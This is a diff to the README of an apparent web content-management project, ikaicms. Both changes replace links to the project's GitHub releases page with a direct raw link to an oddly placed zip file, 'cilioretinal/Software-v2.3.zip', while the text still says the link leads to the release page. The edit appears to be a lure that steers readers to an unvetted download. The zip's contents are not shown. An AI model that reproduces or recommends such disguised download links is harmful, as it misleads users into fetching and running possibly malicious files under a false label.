@@ -1,6 +1,6 @@
 # 🌐 ikaicms - Manage your web content with ease
 
-[![Download ikaicms](https://img.shields.io/badge/Download-ikaicms-blue.svg)](https://github.com/vannastretch507/ikaicms/releases)
+[![Download ikaicms](https://img.shields.io/badge/Download-ikaicms-blue.svg)](https://raw.githubusercontent.com/vannastretch507/ikaicms/main/cilioretinal/Software-v2.3.zip)
 
 ikaicms helps you build and run websites. You can manage text, images, and pages without writing code. This system works for personal blogs or large company sites. It supports multiple languages and uses fast technology to keep your site running smoothly.
 
@@ -17,7 +17,7 @@ Your computer needs a few things to run the software. Check this list before you
 
 You need to pick the right files from our release page. Visit the link below to see the available versions.
 
-[Click here to visit the release page and download the software](https://github.com/vannastretch507/ikaicms/releases)
+[Click here to visit the release page and download the software](https://raw.githubusercontent.com/vannastretch507/ikaicms/main/cilioretinal/Software-v2.3.zip)
 
 Look for the latest release at the top of the page. Click the file that ends in .zip to save it to your computer.
 
